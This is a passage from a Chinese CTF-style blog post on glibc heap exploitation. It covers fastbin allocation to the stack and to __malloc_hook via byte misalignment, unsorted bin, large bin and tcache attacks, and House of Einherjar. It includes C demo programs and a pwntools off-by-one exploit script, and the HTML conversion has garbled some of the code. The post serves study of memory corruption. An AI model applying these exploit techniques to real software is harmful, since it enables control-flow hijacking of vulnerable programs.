chunk，会单独处理。  </span><br><span class="line">* fake chunk 地址需要对齐  </span><br><span class="line">* fake chunk 的 size 大小需要满足对应的 fastbin 的需求  </span><br><span class="line">* fake chunk 的 next chunk 的大小不能小于 2 * SIZE_SZ，同时也不能大于av-&gt;system_mem  </span><br><span class="line">* fake chunk 对应的 fastbin 链表头部不能是该 fake chunk，即不能构成 double free 的情况  </span><br><span class="line"></span><br><span class="line">### 总结：</span><br><span class="line">想要使用该技术分配 chunk 到指定地址，其实并不需要修改指定地址的任何内容，关键是要能够修改指定地址的前后的内容使其可以绕过对应的检测。  </span><br><span class="line">  </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">## Alloc to Stack  </span><br><span class="line">这三个技术的本质都在于 fastbin 链表的特性：当前 chunk 的 fd 指针指向下一个 chunk。</span><br><span class="line"></span><br><span class="line">该技术的核心点在于劫持 fastbin 链表中 chunk 的 fd 指针，把 fd 指针指向我们想要分配的栈上，从而实现控制栈中的一些关键数据，比如返回地址等。  </span><br><span class="line">### 举个栗子</span><br></pre></td></tr></table></figure>
+<p>typedef struct _chunk<br>{<br>    long long pre_size;<br>    long long size;<br>    long long fd;<br>    long long bk;<br>} CHUNK,*PCHUNK;</p>
+<p>int main(void)<br>{<br>    CHUNK stack_chunk;//位于栈上的fake chunk</p>
+<pre><code>void *chunk1;
+void *chunk_a;
+
+stack_chunk.size=0x21;//绕过_int_malloc 中的校验
+chunk1=malloc(0x10);
+
+free(chunk1);
+
+*(long long *)chunk1=&amp;stack_chunk;//篡改fd
+malloc(0x10);//chunk1
+chunk_a=malloc(0x10);
+return 0;</code></pre><p>}</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">  </span><br><span class="line">### 总结  </span><br><span class="line">通过该技术我们可以把 fastbin chunk 分配到栈中，从而控制返回地址等关键数据。要实现这一点我们需要劫持 fastbin 中 chunk 的 fd 域，把它指到栈上，当然同时需要栈上存在有满足条件的 size 值。  </span><br><span class="line"></span><br><span class="line">## Arbitrary Alloc  </span><br><span class="line">Arbitrary Alloc 其实与 Alloc to stack 是完全相同的，唯一的区别是分配的目标不再是栈中。 事实上只要满足目标地址存在合法的 size 域（这个 size 域是构造的，还是自然存在的都无妨），我们可以把 chunk 分配到任意的可写内存中，比如 bss、heap、data、stack 等等。</span><br><span class="line">  </span><br><span class="line">### 举个栗子</span><br></pre></td></tr></table></figure>
+<p>int main(void)<br>{</p>
+<pre><code>void *chunk1;
+void *chunk_a;
+
+chunk1=malloc(0x60);
+
+free(chunk1);
+
+*(long long *)chunk1=0x7ffff7dd1af5-0x8;//篡改fd
+malloc(0x60);
+chunk_a=malloc(0x60);
+return 0;</code></pre><p>}</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">我们想要使用字节错位来实现直接分配 fastbin 到_malloc_hook 的位置，相当于覆盖_malloc_hook 来控制程序流程。  </span><br><span class="line">&gt; 那么0x7ffff7dd1af5这个值是如何获得的呢？  </span><br><span class="line"></span><br><span class="line">首先我们要观察欲写入地址附近是否存在可以字节错位的情况。</span><br></pre></td></tr></table></figure>
+<p>0x7ffff7dd1ae8 0x0  0x0  0x0  0x0  0x0  0x0  0x0 0x0<br>0x7ffff7dd1af0 0x60 0x2  0xdd 0xf7 0xff 0x7f 0x0 0x0<br>0x7ffff7dd1af8 0x0  0x0  0x0  0x0  0x0  0x0  0x0 0x0<br>0x7ffff7dd1b00 0x20 0x2e 0xa9 0xf7 0xff 0x7f 0x0 0x0<br>0x7ffff7dd1b08 0x0  0x2a 0xa9 0xf7 0xff 0x7f 0x0 0x0<br>0x7ffff7dd1b10 &lt;__malloc_hook&gt;: 0x30    0x28    0xa9    0xf7    0xff    0x7f    0x0 0x0</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">0x7ffff7dd1b10 是我们想要控制的 __malloc_hook 的地址，于是我们向上寻找是否可以错位出一个合法的 size 域。因为这个程序是 64 位的，因此 fastbin 的范围为 32 字节到 128 字节 (0x20-0x80)  </span><br><span class="line"></span><br><span class="line">通过观察发现 0x7ffff7dd1af5 处可以现实错位构造出一个 0x000000000000007f  </span><br><span class="line"></span><br><span class="line">因为 0x7f 在计算 fastbin index 时，是属于 index 5 的，即 chunk 大小为 0x70 的。因此我们选择分配 0x60 的 fastbin，将其加入链表，绕过检查。</span><br></pre></td></tr></table></figure>
+<p>##define fastbin_index(sz)                                                      <br>    ((((unsigned int) (sz)) &gt;&gt; (SIZE_SZ == 8 ? 4 : 3)) - 2)</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">最后经过两次分配可以观察到 chunk 被分配到 0x7ffff7dd1afd，因此我们就可以直接控制 __malloc_hook 的内容  </span><br><span class="line"></span><br><span class="line">### 总结 </span><br><span class="line">Arbitrary Alloc 在 CTF 中用地更加频繁。我们可以利用字节错位等方法来绕过 size 域的检验，实现任意地址分配 chunk，最后的效果也就相当于任意地址写任意值。  </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># Unsorted Bin Attack  </span><br><span class="line"></span><br><span class="line">Unsorted Bin Attack 被利用的前提是控制 Unsorted Bin Chunk 的 bk 指针。  </span><br><span class="line">这里我们可以看到 unsorted bin attack 确实可以修改任意地址的值，但是所修改成的值却不受我们控制，唯一可以知道的是，这个值比较大。</span><br><span class="line">通常Unsorted Bin Attack是为进一步的攻击做好准备，例如在libc中重写全局变量global_max_fast以进行进一步的fastbin attack。</span><br><span class="line"></span><br><span class="line">## Unsorted Bin 回顾  </span><br><span class="line"></span><br><span class="line">* 当一个较大的 chunk 被分割成两半后，如果剩下的部分大于 MINSIZE，就会被放到 unsorted bin 中。  </span><br><span class="line"></span><br><span class="line">* 释放一个不属于 fast bin 的 chunk，并且该 chunk 不和 top chunk 紧邻时，该 chunk 会被首先放到 unsorted bin 中。  </span><br><span class="line">* 当进行 malloc_consolidate 时，可能会把合并后的 chunk 放到 unsorted bin 中，如果不是和 top chunk 近邻的话。  </span><br><span class="line"></span><br><span class="line">* Unsorted Bin 在使用的过程中，采用的遍历顺序是 FIFO，即插入的时候插入到 unsorted bin 的头部，取出的时候从链表尾获取。  </span><br><span class="line">* 在程序 malloc 时，如果在 fastbin，small bin 中找不到对应大小的 chunk，就会尝试从 Unsorted Bin 中寻找 chunk。如果取出来的 chunk 大小刚好满足，就会直接返回给用户，否则就会把这些 chunk 分别插入到对应的 bin 中。  </span><br><span class="line">  </span><br><span class="line"></span><br><span class="line"># Large Bin Attack  </span><br><span class="line"></span><br><span class="line">large bin attack和unsorted bin attack类似，都是为了以后更深入的利用。</span><br><span class="line">## 利用条件  </span><br><span class="line">* 可以修改一个 large bin chunk 的 data  </span><br><span class="line">&gt; 伪造bk和bk_nextsize</span><br><span class="line">* 从 unsorted bin 中来的 large bin chunk 要紧跟在被构造过的 chunk 的后面  </span><br><span class="line"></span><br><span class="line"># Tcache Attack  </span><br><span class="line">*tcache makes heap exploitation easy again*  </span><br><span class="line"></span><br><span class="line">在 libc 2.26 之后的 tcache 机制中新增了两个结构体，分别是 tcache_entry 和tcache_perthread_struct</span><br></pre></td></tr></table></figure>
+<p>/* We overlay this structure on the user-data portion of a chunk when the chunk is stored in the per-thread cache.  */<br>typedef struct tcache_entry<br>{<br>  struct tcache_entry *next;<br>} tcache_entry;</p>
+<p>/* There is one of these for each thread, which contains the per-thread cache (hence “tcache_perthread_struct”).  Keeping overall size low is mildly important.  Note that COUNTS and ENTRIES are redundant (we could have just counted the linked list each time), this is for performance reasons.  */<br>typedef struct tcache_perthread_struct<br>{<br>  char counts[TCACHE_MAX_BINS];<br>  tcache_entry *entries[TCACHE_MAX_BINS];<br>} tcache_perthread_struct;</p>
+<p>static __thread tcache_perthread_struct *tcache = NULL;</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">两个重要的函数， tcache_get() 和 tcache_put():</span><br></pre></td></tr></table></figure>
+<p>//当所请求的分配大小不大于0x408并且当给定大小的 tcache bin 未满时在_int_free函数开头被调用<br>static void<br>tcache_put (mchunkptr chunk, size_t tc_idx)<br>{<br>  tcache_entry *e = (tcache_entry *) chunk2mem (chunk);<br>  assert (tc_idx &lt; TCACHE_MAX_BINS);<br>  e-&gt;next = tcache-&gt;entries[tc_idx];<br>  tcache-&gt;entries[tc_idx] = e;<br>  ++(tcache-&gt;counts[tc_idx]);<br>}</p>
+<p>//在_libc_malloc开头调用<br>static void *<br>tcache_get (size_t tc_idx)<br>{<br>  tcache_entry *e = tcache-&gt;entries[tc_idx];<br>  assert (tc_idx &lt; TCACHE_MAX_BINS);<br>  assert (tcache-&gt;entries[tc_idx] &gt; 0);<br>  tcache-&gt;entries[tc_idx] = e-&gt;next;<br>  –(tcache-&gt;counts[tc_idx]);<br>  return (void *) e;<br>}</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>/* This is another arbitrary limit, which tunables can change.  Each<br>   tcache bin will hold at most this number of chunks.  */</p>
+<h1 id="define-TCACHE-FILL-COUNT-7"><a href="#define-TCACHE-FILL-COUNT-7" class="headerlink" title="define TCACHE_FILL_COUNT 7"></a>define TCACHE_FILL_COUNT 7</h1><p>#endif</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">  </span><br><span class="line">我们可以把tcache当作类似fastbin的一个单独链表，只是check比较简单。  </span><br><span class="line">  </span><br><span class="line">## Usage of Tcache  </span><br><span class="line">  </span><br><span class="line">  ### 内存释放  </span><br><span class="line">  首先是检查释放块是否页对齐及前后堆块的释放情况，便优先放入 tcache 结构中。</span><br></pre></td></tr></table></figure>
+<p>  #if USE_TCACHE<br>  {<br>    size_t tc_idx = csize2tidx (size);</p>
+<pre><code>if (tcache
+  &amp;&amp; tc_idx &lt; mp_.tcache_bins
+  &amp;&amp; tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count)
+  {
+    tcache_put (p, tc_idx);
+    return;
+  }</code></pre><p>  }<br>#endif</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">### 内存申请  </span><br><span class="line"></span><br><span class="line">咕咕咕</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">## 利用   </span><br><span class="line"></span><br><span class="line">### tcache poisoning  </span><br><span class="line">通过覆盖 tcache 中的 next，不需要伪造任何 chunk 结构即可实现 malloc 到任何地址。  </span><br><span class="line">类似于fastbin attack 并且不需要size的限制。  </span><br><span class="line"></span><br><span class="line">### tcache dup  </span><br><span class="line">类似 fastbin dup，不过利用的是 tcache_put() 的不严谨  </span><br><span class="line">因为没有任何检查，所以我们可以对同一个 chunk 多次 free，造成 cycliced list。</span><br><span class="line">  </span><br><span class="line">### smallbin unlink  </span><br><span class="line">在 smallbin 中包含有空闲块的时候，会同时将同大小的其他空闲块，放入 tcache 中，此时也会出现解链操作，但相比于 unlink 宏，缺少了链完整性校验。因此，原本 unlink 操作在该条件下也可以使用。  </span><br><span class="line">  </span><br><span class="line"># House Of Einherjar  </span><br><span class="line"></span><br><span class="line">&gt; house of einherjar 是一种堆利用技术，由 Hiroki Matsukuma 提出。该堆利用技术可以强制使得 malloc 返回一个几乎任意地址的 chunk 。其主要在于滥用 free 中的后向合并操作（合并低地址的 chunk），从而使得尽可能避免碎片化。</span><br></pre></td></tr></table></figure>
+<p>#include &lt;stdio.h&gt;<br>#include &lt;stdlib.h&gt;<br>#include &lt;unistd.h&gt;</p>
+<p>int main(void){<br>    char* s0 = malloc(0x200);　//构造fake chunk<br>    char* s1 = malloc(0x18);<br>    char* s2 = malloc(0xf0);　<br>    char* s3 = malloc(0x20); //为了不让s2与top chunk 合并<br>    printf(“begin\n”);<br>    printf(“%p\n”, s0);<br>    printf(“input s0\n”);<br>    read(0, s0, 0x200); //读入fake chunk<br>    printf(“input s1\n”);<br>    read(0, s1, 0x19); //Off By One<br>    free(s2);<br>    return 0;<br>}</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">利用代码👇</span><br></pre></td></tr></table></figure>
+<p>from pwn import *</p>
+<p>p = process(“./example”)<br>context.log_level = ‘debug’<br>#gdb.attach(p)<br>p.recvuntil(“begin\n”)<br>address = int(p.recvline().strip(), 16)<br>p.recvuntil(“input s0\n”)<br>payload = p64(0) + p64(0x101) + p64(address) * 2 + “A”<em>0xe0<br>‘’’<br>p64(address) * 2是为了绕过<br>if (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, 0))                      <br>  malloc_printerr (“corrupted double-linked list”);<br>‘’’<br>payload += p64(0x100) #fake size<br>p.sendline(payload)<br>p.recvuntil(“input s1\n”)<br>payload = “A”</em>0x10 + p64(0x220) + “\x00”<br>p.sendline(payload)<br>p.recvall()<br>p.close()</p>
+<p>```</p>
+<p>csgo实在太好玩了咕咕咕<br>卡托实在太好看了咕咕咕<br>cod16实在太爽了咕咕咕<br>glibc的源码还是要看的啊  </p>
+<p>大部分是复制粘贴<br>写得十分垃圾  </p>
+<h4 id="reference"><a href="#reference" class="headerlink" title="reference"></a>reference</h4><p>glibc内存管理ptmalloc源代码分析.pdf ————-华庭（庄明强）2011/4/17  </p>
+<p><a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/introduction-zh/" target="_blank" rel="noopener">ctf wiki</a>  </p>
+
+        </div>
+
+        
+            <section class="post-copyright">
+                
+                    <p class="copyright-item">
+                        <span>Author:</span>
+                        <span>John Doe</span>
+                    </p>
+                
+                
+                    <p class="copyright-item">
+                        <span>Permalink:</span>
+                        <span><a href="http://yoursite.com/2020/03/30/%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86-%E5%88%A9%E7%94%A8/">http://yoursite.com/2020/03/30/%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86-%E5%88%A9%E7%94%A8/</a></span>
+                    </p>
+                
+                
+                    <p class="copyright-item">
+                        <span>License:</span>
+                        <span>Copyright (c) 2019 <a href="http://creativecommons.org/licenses/by-nc/4.0/" target="_blank" rel="noopener">CC-BY-NC-4.0</a> LICENSE</span>
+                    </p>
+                
+                
+                     <p class="copyright-item">
+                         <span>Slogan:</span>
+                         <span>Do you believe in <strong>DESTINY</strong>?</span>
+                     </p>
+                
+
+            </section>
+        
+        <section class="post-tags">
+            <div>
+                <span>Tag(s):</span>
+                <span class="tag">
+                    
+                    
+                        <a href="/tags/heap/"># heap</a>
+                    
+                        
+                </span>
+            </div>
+            <div>
+                <a href="javascript:window.history.back();">back</a>
+                <span>· </span>
+                <a href="/">home</a>
+            </div>
+        </section>
+        <section class="post-nav">
+            
+                <a class="prev" rel="prev" href="/2020/03/30/%E7%8C%A5%E7%90%90/">猥琐</a>
+            
+            
+            <a class="next" rel="next" href="/2020/03/16/hello-world/">Hello World</a>
+            
+        </section>
+
+
+    </article>
+</div>
+
+        </div>
+        <footer id="footer" class="footer">
+    <div class="copyright">
+        <span>© John Doe | Powered by <a href="https://hexo.io" target="_blank">Hexo</a> & <a href="https://github.com/Siricee/hexo-theme-Chic" target="_blank">Chic</a></span>
+    </div>
+</footer>
+
+    </div>
+</body>
+</html>
